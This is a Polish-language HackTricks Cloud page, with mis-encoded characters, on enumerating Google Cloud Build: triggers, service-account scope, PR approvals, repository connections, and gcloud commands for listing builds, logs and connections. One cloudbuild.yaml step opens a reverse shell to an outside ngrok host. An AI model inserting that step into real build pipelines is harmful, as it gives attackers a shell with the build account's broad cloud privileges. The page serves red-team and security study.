# GCP - Cloud Build Enum

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

## Podstawowe informacje

Google Cloud Build to zarzÄ…dzana platforma CI/CD, ktÃ³ra **automatyzuje procesy budowania** i wydawania oprogramowania, integrujÄ…c siÄ™ z **repozytoriami kodu ÅºrÃ³dÅ‚owego** i obsÅ‚ugujÄ…c szerokÄ… gamÄ™ jÄ™zykÃ³w programowania. **Pozwala deweloperom na automatyczne budowanie, testowanie i wdraÅ¼anie kodu**, zapewniajÄ…c elastycznoÅ›Ä‡ w dostosowywaniu krokÃ³w budowania i przepÅ‚ywÃ³w pracy.

KaÅ¼dy Cloud Build Trigger jest **powiÄ…zany z Cloud Repository lub bezpoÅ›rednio poÅ‚Ä…czony z zewnÄ™trznym repozytorium** (Github, Bitbucket i Gitlab).

{% hint style="success" %}
Nie widziaÅ‚em Å¼adnego sposobu na kradzieÅ¼ tokena Github/Bitbucket stÄ…d lub z Cloud Repositories, poniewaÅ¼ gdy repozytorium jest pobierane, jest dostÄ™pne przez URL [https://source.cloud.google.com/](https://source.cloud.google.com/) i Github nie jest dostÄ™pny przez klienta.
{% endhint %}

### Wydarzenia

Cloud Build moÅ¼e byÄ‡ wyzwalany, jeÅ›li:

* **Push do gaÅ‚Ä™zi**: OkreÅ›l gaÅ‚Ä…Åº
* **Push nowego tagu**: OkreÅ›l tag
* **Pull request**: OkreÅ›l gaÅ‚Ä…Åº, ktÃ³ra otrzymuje PR
* **RÄ™czne wywoÅ‚anie**
* **WiadomoÅ›Ä‡ Pub/Sub:** OkreÅ›l temat
* **Wydarzenie webhook**: UdostÄ™pni HTTPS URL i Å¼Ä…danie musi byÄ‡ uwierzytelnione za pomocÄ… sekretu

### Wykonanie

SÄ… 3 opcje:

* yaml/json **okreÅ›lajÄ…cy komendy** do wykonania. Zazwyczaj: `/cloudbuild.yaml`
* Tylko jeden, ktÃ³ry moÅ¼na okreÅ›liÄ‡ â€inlineâ€ w konsoli webowej i w cli
* NajczÄ™stsza opcja
* Istotne dla nieautoryzowanego dostÄ™pu
* **Dockerfile** do budowania
* **Buildpack** do budowania

### Uprawnienia SA

**Konto usÅ‚ugi ma zakres `cloud-platform`**, wiÄ™c moÅ¼e **uÅ¼ywaÄ‡ wszystkich przywilejÃ³w.** JeÅ›li **nie okreÅ›lono konta usÅ‚ugi** (jak przy submit), **domyÅ›lne konto usÅ‚ugi** `<proj-number>@cloudbuild.gserviceaccount.com` bÄ™dzie **uÅ¼ywane.**

DomyÅ›lnie nie sÄ… przyznawane Å¼adne uprawnienia, ale doÅ›Ä‡ Å‚atwo jest je nadaÄ‡:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Zatwierdzenia

MoÅ¼liwe jest skonfigurowanie Cloud Build, aby **wymagaÅ‚ zatwierdzeÅ„ do wykonania budowania** (domyÅ›lnie wyÅ‚Ä…czone).

### Zatwierdzenia PR

Gdy wyzwalaczem jest PR, poniewaÅ¼ **kaÅ¼dy moÅ¼e wykonaÄ‡ PR do publicznych repozytoriÃ³w**, byÅ‚oby bardzo niebezpieczne po prostu **pozwoliÄ‡ na wykonanie wyzwalacza z dowolnym PR**. Dlatego domyÅ›lnie wykonanie bÄ™dzie **automatyczne tylko dla wÅ‚aÅ›cicieli i wspÃ³Å‚pracownikÃ³w**, a aby wykonaÄ‡ wyzwalacz z PR innych uÅ¼ytkownikÃ³w, wÅ‚aÅ›ciciel lub wspÃ³Å‚pracownik musi skomentowaÄ‡ `/gcbrun`.

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### PoÅ‚Ä…czenia i Repozytoria

PoÅ‚Ä…czenia mogÄ… byÄ‡ tworzone z:

* **GitHub:** PokaÅ¼e monit OAuth proszÄ…cy o uprawnienia do **uzyskania tokena Github**, ktÃ³ry zostanie przechowany w **Secret Manager.**
* **GitHub Enterprise:** Poprosi o zainstalowanie **GithubApp**. **Token uwierzytelniajÄ…cy** z hosta GitHub Enterprise zostanie utworzony i przechowany w tym projekcie jako sekret w **Secret Manager.**
* **GitLab / Enterprise:** Musisz **dostarczyÄ‡ token dostÄ™pu do API i token dostÄ™pu do odczytu API**, ktÃ³re zostanÄ… przechowane w **Secret Manager.**

Po wygenerowaniu poÅ‚Ä…czenia, moÅ¼esz go uÅ¼yÄ‡ do **powiÄ…zania repozytoriÃ³w, do ktÃ³rych konto Github ma dostÄ™p.**

Ta opcja jest dostÄ™pna przez przycisk:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
ZauwaÅ¼, Å¼e repozytoria poÅ‚Ä…czone tÄ… metodÄ… sÄ… **dostÄ™pne tylko w wyzwalaczach uÅ¼ywajÄ…cych 2. generacji.**
{% endhint %}

### PoÅ‚Ä…cz repozytorium

To nie to samo co **`poÅ‚Ä…czenie`**. To pozwala na **rÃ³Å¼ne** sposoby uzyskania **dostÄ™pu do repozytorium Github lub Bitbucket**, ale **nie generuje obiektu poÅ‚Ä…czenia, ale generuje obiekt repozytorium (1. generacji).**

Ta opcja jest dostÄ™pna przez przycisk:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Przechowywanie

Czasami Cloud Build **generuje nowÄ… przestrzeÅ„ do przechowywania plikÃ³w dla wyzwalacza**. Dzieje siÄ™ tak na przykÅ‚ad w przykÅ‚adzie, ktÃ³ry oferuje GCP z:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Wiadro Storage o nazwie [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) jest utworzone do przechowywania pliku `.tgz` z plikami do uÅ¼ycia.

### Uzyskaj powÅ‚okÄ™
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Zainstaluj gcloud wewnÄ…trz cloud build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

MoÅ¼esz znaleÅºÄ‡ **wraÅ¼liwe informacje w konfiguracjach i logach buildÃ³w**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Eskalacja UprawnieÅ„

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Nieautoryzowany DostÄ™p

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post Exploitation

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Naucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) albo **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriÃ³w na GitHubie**.

</details>
{% endhint %}
